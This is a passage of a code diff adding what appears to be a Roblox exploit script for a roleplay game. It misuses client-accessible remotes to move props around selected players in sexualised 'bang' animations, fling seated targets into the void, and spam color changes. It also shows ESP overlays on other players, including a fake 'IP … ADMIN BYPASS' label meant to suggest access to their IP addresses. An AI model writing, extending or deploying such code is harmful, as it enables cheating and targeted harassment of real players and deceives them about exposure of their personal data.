+            local isSafe = string.find(bName, "plot") or string.find(bName, "road") or string.find(bName, "driveway")
+            while currentInst and currentInst ~= workspace do
+                local lowerName = string.lower(currentInst.Name)
+                if currentInst.Name == "AsliBanZone_TXR" or string.find(lowerName, "ban") or string.find(lowerName, "pool") or (string.find(lowerName, "house") and not isSafe) then
+                    inDangerZone = true
+                    break
+                end
+                currentInst = currentInst.Parent
+            end
+            if inDangerZone then break end
+        end
+
+        if inDangerZone then
+            targetCFrame = CFrame.new(120, -350, 150)
+            isEmergency = true
+        end
+    end
+
+    if not isEmergency then
+        isEmergency = targetCFrame.Y < -100 or targetCFrame.Y > 10000
+    end
+
+    pcall(function() 
+        local parent = remote.Parent
+        if parent:IsA("Model") then 
+            local part = parent.PrimaryPart or parent:FindFirstChildWhichIsA("BasePart")
+            if part then 
+                if isEmergency or (part.Position - targetCFrame.Position).Magnitude > 50 then
+                    part.CFrame = targetCFrame 
+                else
+                    part.CFrame = part.CFrame:Lerp(targetCFrame, 0.75) 
+                end
+            end 
+        elseif parent:IsA("BasePart") then 
+            if isEmergency or (parent.Position - targetCFrame.Position).Magnitude > 50 then
+                parent.CFrame = targetCFrame
+            else
+                parent.CFrame = parent.CFrame:Lerp(targetCFrame, 0.75) 
+            end
+        end 
+    end)
+    
+    local now = tick()
+    if isEmergency or not lastRemoteFireTimes[remote] or (now - lastRemoteFireTimes[remote]) >= FIRE_INTERVAL then
+        lastRemoteFireTimes[remote] = now
+        task.spawn(function() 
+            pcall(function() remote:InvokeServer(targetCFrame) end) 
+        end)
+    end
+end
+
+RunService.Stepped:Connect(function()
+    if _G.TXR_InstanceID ~= currentExecutionID then 
+        return 
+    end 
+    
+    if isGodShieldEnabled and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
+        local char = lp.Character
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        local root = char.HumanoidRootPart
+        
+        if hum then
+            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false) 
+            if hum.Sit then
+                hum.Sit = false
+                hum.Jump = true
+                hum:ChangeState(Enum.HumanoidStateType.Running)
+                pcall(function() 
+                    root.CFrame = root.CFrame + Vector3.new(0, 1.5, 0) 
+                end) 
+            end
+        end
+        
+        for _, v in ipairs(char:GetDescendants()) do
+            if v:IsA("Weld") or v.Name == "SeatWeld" then
+                pcall(function() 
+                    v:Destroy() 
+                end) 
+            end
+        end
+
+        pcall(function()
+            local radiusParts = workspace:GetPartBoundsInRadius(root.Position, 15)
+            for _, part in ipairs(radiusParts) do
+                if part:IsA("BasePart") and not part:IsDescendantOf(char) and not part.Anchored then
+                    pcall(function() 
+                        part.CanCollide = false 
+                    end)
+                end
+            end
+            
+            for _, plr in ipairs(Players:GetPlayers()) do
+                if plr ~= lp and plr.Character then
+                    for _, p in ipairs(plr.Character:GetChildren()) do
+                        if p:IsA("BasePart") then
+                            pcall(function() 
+                                p.CanCollide = false 
+                            end)
+                        end
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+local function isPlayerSeated(plr)
+    if not plr.Character then return false end
+    local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+    if hum and hum.Sit then return true end
+    for _, desc in ipairs(plr.Character:GetDescendants()) do
+        if desc:IsA("Seat") or desc:IsA("VehicleSeat") or desc.Name == "SeatWeld" then
+            return true
+        end
+    end
+    return false
+end
+
+RunService.Heartbeat:Connect(function(dt)
+    if _G.TXR_InstanceID ~= currentExecutionID then return end 
+    if not gui or not gui.Parent then 
+        isSystemActive = false 
+        task.spawn(StopRobotBangMusic)
+        return 
+    end
+    if not isSystemActive then return end 
+
+    for plr in pairs(assignedRemotes) do
+        if not selectedPlayers[plr] or not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") then
+            assignedRemotes[plr] = nil 
+            targetVelocities[plr] = nil
+        end
+    end
+    
+    for plr in pairs(voidedPlayers) do
+        if not selectedPlayers[plr] then voidedPlayers[plr] = nil end
+    end
+
+    local runTime = os.clock() 
+    local speedMultiplier = (getSpeedMs() / 20)
+    local smoothAnimTime = runTime * speedMultiplier
+    local smoothAngle = runTime * speedMultiplier * 1.5
+    local smoothSelfAngle = runTime * speedMultiplier * 2.5 
+    
+    local robotSpeedMultiplier = getSpeedMs() / 20 
+    robotAnimTime = robotAnimTime + (dt * robotSpeedMultiplier)
+    
+    local currentPing = 0.05
+    pcall(function() currentPing = lp:GetNetworkPing() end)
+    local predictionTime = math.clamp(currentPing + 0.03, 0.04, 0.2)
+    
+    local allRemotes = getAvailableRemotes()
+    local tCount = 0
+    local targetList = {}
+    
+    for plr, _ in pairs(selectedPlayers) do 
+        if plr.UserId == CREATOR_USER_ID and lp.UserId ~= CREATOR_USER_ID then
+            triggerBanTrap()
+            return
+        end
+        if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then 
+            table.insert(targetList, plr)
+            tCount = tCount + 1 
+        end 
+    end
+
+    if tCount > 0 and #allRemotes > 0 then
+        local currentRadius = getRadius()
+        local rScale = currentRadius / 15 
+
+        local targetSafeOffsets = {}
+        for _, plr in ipairs(targetList) do
+            targetSafeOffsets[plr] = Vector3.new(0, 0, 0)
+            
+            if isEvading then
+                targetSafeOffsets[plr] = Vector3.new(0, 15000, 0) 
+            elseif activeModes["HouseProt"] and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                local tRoot = plr.Character.HumanoidRootPart
+                local pOffset = (targetVelocities[plr] or tRoot.AssemblyLinearVelocity) * predictionTime
+                local checkPos = tRoot.Position + pOffset
+                
+                local params = OverlapParams.new()
+                local ignoreList = {lp.Character}
+                for _, p in ipairs(Players:GetPlayers()) do
+                    if p.Character then table.insert(ignoreList, p.Character) end
+                end
+                if workspace:FindFirstChild("Vehicles") then table.insert(ignoreList, workspace.Vehicles) end
+                if workspace:FindFirstChild("WorkspaceCom") then table.insert(ignoreList, workspace.WorkspaceCom) end
+                params.FilterDescendantsInstances = ignoreList
+                params.FilterType = Enum.RaycastFilterType.Exclude
+
+                local inDangerZone = false
+                local partsInBubble = workspace:GetPartBoundsInBox(CFrame.new(checkPos), Vector3.new(6, 100000, 6), params)
+                for _, hitInst in ipairs(partsInBubble) do
+                    local currentInst = hitInst
+                    local bName = string.lower(hitInst.Name)
+                    local isSafe = string.find(bName, "plot") or string.find(bName, "road") or string.find(bName, "driveway")
+                    while currentInst and currentInst ~= workspace do
+                        local lowerName = string.lower(currentInst.Name)
+                        if currentInst.Name == "AsliBanZone_TXR" or string.find(lowerName, "ban") or string.find(lowerName, "pool") or (string.find(lowerName, "house") and not isSafe) then
+                            inDangerZone = true
+                            break
+                        end
+                        currentInst = currentInst.Parent
+                    end
+                    if inDangerZone then break end
+                end
+
+                if inDangerZone then
+                    targetSafeOffsets[plr] = CFrame.new(120, -350, 150).Position - tRoot.Position
+                end
+            end
+        end
+
+        for _, plr in ipairs(targetList) do
+            local tRoot = plr.Character.HumanoidRootPart
+            local tHum = plr.Character:FindFirstChildOfClass("Humanoid")
+            if type(assignedRemotes[plr]) ~= "table" then assignedRemotes[plr] = {} end
+
+            if not activeModes["HeadBang"] then
+                assignedRemotes[plr].h_front = nil
+                assignedRemotes[plr].h_back = nil
+            end
+            if not activeModes["Robot"] then
+                assignedRemotes[plr].front = nil
+                assignedRemotes[plr].back = nil
+                assignedRemotes[plr].left = nil
+                assignedRemotes[plr].right = nil
+            end
+            if not activeModes["MultiRobot"] then
+                assignedRemotes[plr].m_front = nil
+                assignedRemotes[plr].m_back = nil
+            end
+            
+            local bodyPart = plr.Character:FindFirstChild("Torso") or plr.Character:FindFirstChild("LowerTorso") or tRoot
+            local rawVelocity = tRoot.AssemblyLinearVelocity
+            
+            if rawVelocity.Magnitude > 150 or rawVelocity.Y > 100 or rawVelocity.Y < -100 then 
+                rawVelocity = Vector3.new(0, 0, 0)
+            end
+
+            if not targetVelocities[plr] then targetVelocities[plr] = rawVelocity end
+            
+            local velocityDiff = (rawVelocity - targetVelocities[plr]).Magnitude
+            if rawVelocity.Magnitude < 2 then
+                targetVelocities[plr] = targetVelocities[plr]:Lerp(rawVelocity, dt * 50)
+            elseif velocityDiff > 100 then
+                targetVelocities[plr] = targetVelocities[plr]:Lerp(rawVelocity, dt * 45)
+            else
+                targetVelocities[plr] = targetVelocities[plr]:Lerp(rawVelocity, dt * 10)
+            end
+            
+            local predictedOffset = targetVelocities[plr] * predictionTime
+            local bodyPos = bodyPart.Position + predictedOffset + targetSafeOffsets[plr]
+            
+            local flatLook = Vector3.new(tRoot.CFrame.LookVector.X, 0, tRoot.CFrame.LookVector.Z)
+            if flatLook.Magnitude > 0.01 then flatLook = flatLook.Unit else flatLook = Vector3.new(0, 0, -1) end
+            
+            local dynamicBaseCFrame = CFrame.lookAt(bodyPos, bodyPos + flatLook)
+            
+            local isSitting = (tHum and tHum.Sit)
+            local isRagdoll = (tHum and tHum:GetState() == Enum.HumanoidStateType.Physics)
+            
+            local yOffset = isSitting and -2.5 or (isRagdoll and -1.5 or -3.8)
+            local tiltAngle = isRagdoll and math.rad(-90) or 0
+
+            local centerGroundPos = bodyPos + Vector3.new(0, yOffset, 0)
+            local maxBaseDist = math.max(2.5, 4.0 * rScale) 
+            local touchDist = 1.0 
+            
+            local snapPower = (math.sin(smoothAnimTime * 6.5) + 1) / 2
+            local smoothDist = maxBaseDist - ((maxBaseDist - touchDist) * snapPower)
+            
+            local robotBangCycle = (math.sin(robotAnimTime * 6.5) + 1) / 2
+            local robotSmoothDist = maxBaseDist - ((maxBaseDist - touchDist) * robotBangCycle)
+
+            if activeModes["HeadBang"] then
+                local slots = {"h_front", "h_back"}
+                for _, slot in ipairs(slots) do 
+                    if not assignedRemotes[plr][slot] or not assignedRemotes[plr][slot].Parent then 
+                        for _, r in ipairs(allRemotes) do 
+                            if not isRemoteAssigned(r) then 
+                                assignedRemotes[plr][slot] = r
+                                break 
+                            end 
+                        end 
+                    end 
+                end
+                
+                local actualHead = plr.Character:FindFirstChild("Head") or tRoot
+                local headPos = actualHead.Position + predictedOffset + targetSafeOffsets[plr]
+                local headLockCFrame = CFrame.lookAt(headPos, headPos + flatLook)
+                
+                local headY = (isSitting or isRagdoll) and -0.8 or -2.4 
+                local headDist = 1.0 + (1.5 * rScale) - (((1.5 * rScale)) * snapPower)
+                
+                if assignedRemotes[plr].h_front then 
+                    dispatchRemote(assignedRemotes[plr].h_front, headLockCFrame * CFrame.new(0, headY, -headDist)) 
+                end
+                if assignedRemotes[plr].h_back then 
+                    dispatchRemote(assignedRemotes[plr].h_back, headLockCFrame * CFrame.new(0, headY, headDist) * CFrame.Angles(0, math.rad(180), 0)) 
+                end
+            end
+
+            if activeModes["Robot"] then
+                local slots = {"back", "front", "left", "right"}
+                for _, slot in ipairs(slots) do 
+                    if not assignedRemotes[plr][slot] or not assignedRemotes[plr][slot].Parent then 
+                        for _, r in ipairs(allRemotes) do 
+                            if not isRemoteAssigned(r) then 
+                                assignedRemotes[plr][slot] = r
+                                break 
+                            end 
+                        end 
+                    end 
+                end 
+                
+                local fPos = centerGroundPos + (dynamicBaseCFrame.LookVector * robotSmoothDist)
+                local bPos = centerGroundPos - (dynamicBaseCFrame.LookVector * robotSmoothDist)
+                local lPos = centerGroundPos - (dynamicBaseCFrame.RightVector * robotSmoothDist)
+                local rPos = centerGroundPos + (dynamicBaseCFrame.RightVector * robotSmoothDist)
+                
+                if assignedRemotes[plr].front then dispatchRemote(assignedRemotes[plr].front, CFrame.lookAt(fPos, centerGroundPos) * CFrame.Angles(tiltAngle, math.rad(180), 0)) end
+                if assignedRemotes[plr].back then dispatchRemote(assignedRemotes[plr].back, CFrame.lookAt(bPos, centerGroundPos) * CFrame.Angles(tiltAngle, math.rad(180), 0)) end
+                if assignedRemotes[plr].left then dispatchRemote(assignedRemotes[plr].left, CFrame.lookAt(lPos, centerGroundPos) * CFrame.Angles(tiltAngle, math.rad(180), 0)) end
+                if assignedRemotes[plr].right then dispatchRemote(assignedRemotes[plr].right, CFrame.lookAt(rPos, centerGroundPos) * CFrame.Angles(tiltAngle, math.rad(180), 0)) end
+            end
+
+            if activeModes["MultiRobot"] then
+                local slots = {"m_back", "m_front"}
+                for _, slot in ipairs(slots) do 
+                    if not assignedRemotes[plr][slot] or not assignedRemotes[plr][slot].Parent then 
+                        for _, r in ipairs(allRemotes) do 
+                            if not isRemoteAssigned(r) then 
+                                assignedRemotes[plr][slot] = r
+                                break 
+                            end 
+                        end 
+                    end 
+                end 
+                
+                local fPos = centerGroundPos + (dynamicBaseCFrame.LookVector * smoothDist)
+                local bPos = centerGroundPos - (dynamicBaseCFrame.LookVector * smoothDist)
+                
+                if assignedRemotes[plr].m_front then dispatchRemote(assignedRemotes[plr].m_front, CFrame.lookAt(fPos, centerGroundPos) * CFrame.Angles(tiltAngle, math.rad(180), 0)) end
+                if assignedRemotes[plr].m_back then dispatchRemote(assignedRemotes[plr].m_back, CFrame.lookAt(bPos, centerGroundPos) * CFrame.Angles(tiltAngle, math.rad(180), 0)) end
+            end
+        end
+
+        local freeRemotes = {}
+        for _, r in ipairs(allRemotes) do 
+            if not isRemoteAssigned(r) then table.insert(freeRemotes, r) end 
+        end
+
+        if #freeRemotes > 0 then
+            if activeModes["Chair"] then
+                for idx, remote in ipairs(freeRemotes) do
+                    local targetIdx = ((idx - 1) % tCount) + 1
+                    local plr = targetList[targetIdx]
+                    local tRoot = plr.Character.HumanoidRootPart
+                    local tHum = plr.Character:FindFirstChildOfClass("Humanoid")
+                    
+                    local isSeated = isPlayerSeated(plr)
+                    if voidedPlayers[plr] and not isSeated and tRoot.Position.Y > -1000 then voidedPlayers[plr] = nil end
+                    
+                    if isSeated or voidedPlayers[plr] then
+                        voidedPlayers[plr] = true
+                        task.spawn(function() pcall(function() remote:InvokeServer(CFrame.new(120, -350, 150)) end) end)
+                    else
+                        local propsForThisTarget = math.min(4, math.ceil(#freeRemotes / tCount))
+                        local localChairIndex = (idx - 1) % propsForThisTarget
+                        
+                        if localChairIndex < propsForThisTarget then
+                            local bodyPart = plr.Character:FindFirstChild("Torso") or plr.Character:FindFirstChild("LowerTorso") or tRoot
+                            local rawVel = tRoot.AssemblyLinearVelocity
+                            
+                            local pOffset = targetVelocities[plr] * predictionTime
+                            local bodyPos = bodyPart.Position + pOffset + targetSafeOffsets[plr]
+                            
+                            local yVelocity = rawVel.Y
+                            local isJumpingOrFreefall = (tHum and (tHum:GetState() == Enum.HumanoidStateType.Jumping or tHum:GetState() == Enum.HumanoidStateType.Freefall))
+                            local airLiftOffset = 0
+                            if isJumpingOrFreefall or yVelocity > 2 then airLiftOffset = math.clamp(yVelocity * 0.16, 0, 7.5) end
+
+                            local blitzTime = runTime * 45 + (localChairIndex * (math.pi * 2 / propsForThisTarget))
+                            local radOffset = (math.pi * 2 / propsForThisTarget) * localChairIndex
+                            
+                            local radiusBase = 1.0 + (localChairIndex * 0.2)
+                            local sweepX = math.cos(blitzTime + radOffset) * radiusBase
+                            local sweepZ = math.sin(blitzTime + radOffset) * radiusBase
+                            local heightLayer = ((localChairIndex % 2) - 0.5) * 1.8 
+                            local verticalWave = math.sin(blitzTime * 3.0 + localChairIndex) * 1.8
+                            
+                            local dynamicChairCFrame = CFrame.new(bodyPos) 
+                                * CFrame.new(sweepX, (-2.6 + airLiftOffset + heightLayer) + verticalWave, sweepZ) 
+                                * CFrame.Angles(math.sin(blitzTime) * 0.4, blitzTime * 2.5, math.cos(blitzTime) * 0.4)
+                            
+                            dispatchRemote(remote, dynamicChairCFrame)
+                        end
+                    end
+                end
+            elseif activeModes["Ring"] then
+                for i, remote in ipairs(freeRemotes) do
+                    local targetIdx = ((i - 1) % tCount) + 1
+                    local plr = targetList[targetIdx]
+                    
+                    local tRoot = plr.Character.HumanoidRootPart
+                    local bodyPart = plr.Character:FindFirstChild("Torso") or plr.Character:FindFirstChild("LowerTorso") or tRoot
+                    local pOffset = targetVelocities[plr] * predictionTime
+                    local bodyPos = bodyPart.Position + pOffset + targetSafeOffsets[plr]
+                    local ringCenterPos = bodyPos + Vector3.new(0, -3.8, 0)
+                    
+                    local propsForThisTarget = 0
+                    local myLocalIdx = 0
+                    
+                    for j = 1, #freeRemotes do 
+                        if (((j - 1) % tCount) + 1) == targetIdx then 
+                            if j < i then myLocalIdx = myLocalIdx + 1 end
+                            propsForThisTarget = propsForThisTarget + 1 
+                        end 
+                    end
+                    
+                    if propsForThisTarget > 0 then
+                        local angleRad = (math.pi * 2 / propsForThisTarget) * myLocalIdx
+                        local rBaseDist = math.max(3.5, 4.5 * rScale) 
+                        local rSnap = (math.sin(smoothAnimTime * 6.5) + 1) / 2
+                        local rSmooth = rBaseDist - ((rBaseDist - 1.5) * rSnap)
+                        
+                        local propPos = ringCenterPos + Vector3.new(math.sin(angleRad) * rSmooth, 0, math.cos(angleRad) * rSmooth)
+                        dispatchRemote(remote, CFrame.lookAt(propPos, ringCenterPos) * CFrame.Angles(0, math.rad(180), 0))
+                    end
+                end
+            elseif activeModes["Orbit"] then
+                for idx, remote in ipairs(freeRemotes) do
+                    local targetIdx = ((idx - 1) % tCount) + 1
+                    local plr = targetList[targetIdx]
+                    
+                    local tRoot = plr.Character.HumanoidRootPart
+                    local bodyPart = plr.Character:FindFirstChild("Torso") or plr.Character:FindFirstChild("LowerTorso") or tRoot
+                    local pOffset = targetVelocities[plr] * predictionTime
+                    local bodyPos = bodyPart.Position + pOffset + targetSafeOffsets[plr]
+                    
+                    local flatLook = Vector3.new(tRoot.CFrame.LookVector.X, 0, tRoot.CFrame.LookVector.Z)
+                    if flatLook.Magnitude > 0.01 then flatLook = flatLook.Unit else flatLook = Vector3.new(0, 0, -1) end
+                    local dynamicOrbitBase = CFrame.lookAt(bodyPos, bodyPos + flatLook)
+                    
+                    local propsForThisTarget = 0
+                    local myLocalIdx = 0
+                    
+                    for j = 1, #freeRemotes do
+                        if (((j - 1) % tCount) + 1) == targetIdx then
+                            propsForThisTarget = propsForThisTarget + 1
+                            if j <= idx then myLocalIdx = propsForThisTarget end
+                        end
+                    end
+                    
+                    local x, y, z = 0, 0, 0
+                    local radRatio = (myLocalIdx / propsForThisTarget) * math.pi * 2 
+                    
+                    if activeGeometry == "Standard Orbit" then
+                        x = math.cos(radRatio + smoothAngle) * currentRadius
+                        z = math.sin(radRatio + smoothAngle) * currentRadius
+                    elseif activeGeometry == "Spin" then 
+                        x = math.cos(radRatio + smoothAngle) * currentRadius
+                        z = math.sin(radRatio + smoothAngle) * currentRadius
+                    elseif activeGeometry == "Reverse Spin" then 
+                        x = math.cos(radRatio - smoothAngle) * currentRadius
+                        z = math.sin(radRatio - smoothAngle) * currentRadius
+                    elseif activeGeometry == "Bobbing Orbit" then 
+                        x = math.cos(radRatio + smoothAngle) * currentRadius
+                        z = math.sin(radRatio + smoothAngle) * currentRadius
+                        y = math.sin((smoothAngle * 2) + radRatio) * (currentRadius * 0.3)
+                    elseif activeGeometry == "Vertical Halo" then
+                        x = math.cos(radRatio + smoothAngle) * currentRadius
+                        y = math.sin(radRatio + smoothAngle) * currentRadius
+                    elseif activeGeometry == "Atom" then
+                        local axis = myLocalIdx % 3
+                        if axis == 0 then x = math.cos(radRatio + smoothAngle) * currentRadius; z = math.sin(radRatio + smoothAngle) * currentRadius
+                        elseif axis == 1 then x = math.cos(radRatio + smoothAngle) * currentRadius; y = math.sin(radRatio + smoothAngle) * currentRadius
+                        else z = math.cos(radRatio + smoothAngle) * currentRadius; y = math.sin(radRatio + smoothAngle) * currentRadius end
+                    elseif activeGeometry == "Galaxy Spiral" then
+                        local dynRad = currentRadius * (0.4 + 0.6 * math.sin(smoothAngle + radRatio * 2))
+                        x = math.cos(radRatio + smoothAngle) * dynRad
+                        z = math.sin(radRatio + smoothAngle) * dynRad
+                    elseif activeGeometry == "Crown" then
+                        y = 2.5 + math.sin(radRatio * 3 + smoothAngle * 4) * 0.8
+                        x = math.cos(radRatio + smoothAngle) * (currentRadius * 0.5)
+                        z = math.sin(radRatio + smoothAngle) * (currentRadius * 0.5)
+                    elseif activeGeometry == "DNA" then
+                        local helixHeight = currentRadius * 1.5
+                        local phase = (myLocalIdx % 2 == 0) and math.pi or 0
+                        local heightProgress = math.floor((myLocalIdx - 1) / 2) / math.max(1, math.floor(propsForThisTarget / 2))
+                        y = (heightProgress * helixHeight) - (helixHeight/2) + math.sin(smoothAngle)
+                        local helixRad = currentRadius * 0.4
+                        x = math.cos(heightProgress * math.pi * 4 + smoothAngle * 2 + phase) * helixRad
+                        z = math.sin(heightProgress * math.pi * 4 + smoothAngle * 2 + phase) * helixRad
+                    elseif activeGeometry == "Snake Body" then
+                        local delay = myLocalIdx * 0.3
+                        x = math.cos(smoothAngle - delay) * currentRadius
+                        z = math.sin(smoothAngle - delay) * currentRadius
+                        y = math.sin((smoothAngle - delay) * 2) * (currentRadius * 0.3)
+                    elseif activeGeometry == "Wings" then
+                        local side = (myLocalIdx % 2 == 0) and 1 or -1
+                        local wingIdx = math.ceil(myLocalIdx / 2)
+                        local totalWings = math.max(1, math.ceil(propsForThisTarget / 2))
+                        local wingProgress = wingIdx / totalWings
+                        x = side * (1 + wingProgress * currentRadius)
+                        y = 0.5 + (wingProgress * currentRadius * 0.8) + math.sin(smoothAngle + wingProgress * 2) * 0.5
+                        z = 1.5 + (wingProgress * 0.5)
+                    elseif activeGeometry == "BlackHole Vortex" then
+                        local dynR = currentRadius * (0.5 + 0.5 * math.sin(smoothAngle * 2 + radRatio))
+                        x = math.cos(radRatio + smoothAngle * 2) * dynR
+                        z = math.sin(radRatio + smoothAngle * 2) * dynR
+                        y = math.sin(smoothAngle + radRatio) * 2
+                    elseif activeGeometry == "Quantum Pulsar" then
+                        local pulseR = currentRadius * (0.8 + 0.4 * math.sin(smoothAngle * 3))
+                        x = math.cos(radRatio + smoothAngle) * pulseR
+                        z = math.sin(radRatio + smoothAngle) * pulseR
+                    elseif activeGeometry == "Hyper Wave" then
+                        x = math.cos(radRatio + smoothAngle) * currentRadius
+                        z = math.sin(radRatio + smoothAngle) * currentRadius
+                        y = math.sin(smoothAngle * 3 + radRatio * 2) * 3
+                    elseif activeGeometry == "Supernova Explosion" then
+                        local expR = currentRadius * (0.3 + math.abs(math.sin(smoothAngle * 4)))
+                        x = math.cos(radRatio + smoothAngle) * expR
+                        z = math.sin(radRatio + smoothAngle) * expR
+                        y = math.sin(smoothAngle * 2) * 2
+                    elseif activeGeometry == "Matrix Grid" then
+                        local gridCol = math.fmod(myLocalIdx, 4) - 1.5
+                        local gridRow = math.floor((myLocalIdx - 1) / 4) - 1
+                        x = gridCol * (currentRadius * 0.3)
+                        z = gridRow * (currentRadius * 0.3)
+                        y = math.sin(smoothAngle + myLocalIdx) * 1.5
+                    elseif activeGeometry == "Eclipse Shadowing" then
+                        local ellipR = currentRadius * 1.3
+                        x = math.cos(radRatio + smoothAngle) * ellipR
+                        z = math.sin(radRatio + smoothAngle) * (currentRadius * 0.5)
+                        y = math.cos(smoothAngle * 2) * 1.2
+                    else 
+                        x = math.cos(radRatio + smoothAngle) * currentRadius
+                        z = math.sin(radRatio + smoothAngle) * currentRadius 
+                    end
+                    
+                    dispatchRemote(remote, dynamicOrbitBase * CFrame.new(Vector3.new(x, y, z)) * CFrame.Angles(smoothSelfAngle, smoothSelfAngle, smoothSelfAngle))
+                end
+            end
+        end
+    end
+end)
+
+local hue = 0
+RunService.Heartbeat:Connect(function(dt)
+    if _G.TXR_InstanceID ~= currentExecutionID then return end 
+    if isRainbowEnabled then 
+        local speedMultiplier = (getSpeedMs() / 20)
+        hue = (hue + (0.5 * speedMultiplier * dt)) % 1
+    end
+end)
+
+-- 🌈 RGB LOOP ENGINE
+task.spawn(function()
+    local RE = game:GetService("ReplicatedStorage"):WaitForChild("RE", 10)
+    while _G.TXR_InstanceID == currentExecutionID and gui.Parent do 
+        if isRainbowEnabled then
+            local syncColor = Color3.fromHSV(hue, 1, 1)
+
+            pcall(function()
+                local playerGui = lp:FindFirstChild("PlayerGui")
+                if playerGui then
+                    local noResetGui = playerGui:FindFirstChild("NoResetGUIHandler")
+                    if noResetGui then
+                        local propColorPicker = noResetGui:FindFirstChild("PropColorPicker")
+                        if propColorPicker and propColorPicker:FindFirstChild("SetColor") then
+                            propColorPicker.SetColor:FireServer(syncColor)
+                        end
+                    end
+                end
+                
+                for _, desc in ipairs(workspace:GetDescendants()) do
+                    if desc.Name == "ChangePropColor" and desc:IsA("RemoteFunction") then
+                        task.spawn(function() pcall(function() desc:InvokeServer(syncColor) end) end)
+                    end
+                end
+
+                if RE then
+                    for _, remote in ipairs(RE:GetChildren()) do
+                        if remote:IsA("RemoteEvent") then
+                            pcall(function()
+                                remote:FireServer("ToolColor", syncColor)
+                                remote:FireServer("Color", syncColor)
+                                remote:FireServer("PropColor", syncColor)
+                                remote:FireServer("PickingScooterColor", syncColor)
+                            end)
+                        end
+                    end
+                end
+            end)
+        end
+        task.wait(0.1) 
+    end
+end)
+
+-- =================================================================
+-- 👁️ TACTICAL ESP RENDER ENGINE (IP - NEED ADMIN ACCESS)
+-- =================================================================
+local espGuiParent = game:GetService("CoreGui")
+pcall(function() if not espGuiParent then espGuiParent = lp:WaitForChild("PlayerGui") end end)
+if _G.TXR_ESP_GUI and _G.TXR_ESP_GUI.Parent then _G.TXR_ESP_GUI:Destroy() end
+
+local mainEspGui = Instance.new("ScreenGui", espGuiParent)
+mainEspGui.Name = "TXR_TacticalESP_" .. tostring(math.random(100000, 999999))
+mainEspGui.IgnoreGuiInset = true
+_G.TXR_ESP_GUI = mainEspGui
+
+local function getESPContainer(plr)
+    if not espObjects[plr] then
+        local container = Instance.new("Frame", mainEspGui)
+        container.BackgroundTransparency = 1
+        container.Visible = false
+        
+        local box = Instance.new("Frame", container)
+        box.Size = UDim2.new(1, 0, 1, 0)
+        box.BackgroundTransparency = 1
+        local stroke = Instance.new("UIStroke", box)
+        stroke.Color = Colors.Primary
+        stroke.Thickness = 1.5
+        stroke.Transparency = 0.2
+        
+        local nameLabel = Instance.new("TextLabel", container)
+        nameLabel.Size = UDim2.new(1, 0, 0, 15)
+        nameLabel.Position = UDim2.new(0, 0, 0, -18)
+        nameLabel.BackgroundTransparency = 1
+        nameLabel.TextColor3 = Colors.Text
+        nameLabel.Font = Enum.Font.GothamBlack
+        nameLabel.TextSize = 12
+        crispText(nameLabel)
+        
+        local detailsLabel = Instance.new("TextLabel", container)
+        detailsLabel.Size = UDim2.new(3.0, 0, 0, 85) 
+        detailsLabel.Position = UDim2.new(-1.0, 0, 1, 3) 
+        detailsLabel.BackgroundTransparency = 1
+        detailsLabel.TextColor3 = Colors.PrimaryDark
+        detailsLabel.Font = Enum.Font.Code
+        detailsLabel.TextSize = 10
+        detailsLabel.TextYAlignment = Enum.TextYAlignment.Top
+        detailsLabel.TextXAlignment = Enum.TextXAlignment.Center
+        detailsLabel.LineHeight = 1.1
+        crispText(detailsLabel)
+        
+        espObjects[plr] = {
+            container = container, 
+            name = nameLabel, 
+            details = detailsLabel
+        }
+    end
+    return espObjects[plr]
+end
+
+RunService.RenderStepped:Connect(function()
+    if _G.TXR_InstanceID ~= currentExecutionID then return end 
+    if not mainEspGui.Parent then return end
+    
+    local camera = workspace.CurrentCamera
+    local myRoot = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
+    local hasAdmin = checkAdminAccess(lp)
+    
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= lp then
+            if activeModes["ESP"] and selectedPlayers[plr] and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Head") then
+                local root = plr.Character.HumanoidRootPart
+                local head = plr.Character.Head
+                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+                
+                local topPos = head.Position + Vector3.new(0, 0.5, 0)
+                local bottomPos = root.Position - Vector3.new(0, 3, 0)
+                
+                local topViewport, onScreen1 = camera:WorldToViewportPoint(topPos)
+                local bottomViewport, onScreen2 = camera:WorldToViewportPoint(bottomPos)
+                
+                local esp = getESPContainer(plr)
+                
+                if onScreen1 or onScreen2 then
+                    esp.container.Visible = true
+                    local height = math.abs(bottomViewport.Y - topViewport.Y)
+                    local width = height * 0.55
+                    
+                    esp.container.Size = UDim2.new(0, width, 0, height)
+                    esp.container.Position = UDim2.new(0, topViewport.X - (width/2), 0, topViewport.Y)
+                    
+                    local dist = math.floor((camera.CFrame.Position - root.Position).Magnitude)
+                    local hp = hum and math.floor(hum.Health) or 0
+                    local altStr = "0m"
+                    if myRoot then
+                        local altDiff = math.floor(root.Position.Y - myRoot.Position.Y)
+                        if altDiff > 0 then altStr = "+"..altDiff.."m" elseif altDiff < 0 then altStr = altDiff.."m" end
+                    end
+                    
+                    local speed = math.floor(root.AssemblyLinearVelocity.Magnitude)
+                    
+                    esp.name.Text = plr.DisplayName
+                    
+                    if hasAdmin then
+                        esp.details.Text = string.format("DIST: %dm | HP: %d%%\nALT: %s | SPD: %du/s\nIP: 192.168.1.1 (ADMIN BYPASS)", dist, hp, altStr, speed)
+                    else
+                        esp.details.Text = string.format("DIST: %dm | HP: %d%%\nALT: %s | SPD: %du/s\nIP - NEED ADMIN ACCESS", dist, hp, altStr, speed)
+                    end
+
+                    esp.name.TextColor3 = isSystemActive and Colors.Danger or Colors.Primary
+                    esp.details.TextColor3 = isSystemActive and Color3.fromRGB(255, 100, 100) or Colors.PrimaryDark
+                else
+                    esp.container.Visible = false
+                end
+            else
+                if espObjects[plr] then espObjects[plr].container.Visible = false end
+            end
+        end
+    end
+end)
+
+Players.PlayerRemoving:Connect(function(plr)
+    if espObjects[plr] then
+        espObjects[plr].container:Destroy()
+        espObjects[plr] = nil
+    end
+end)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
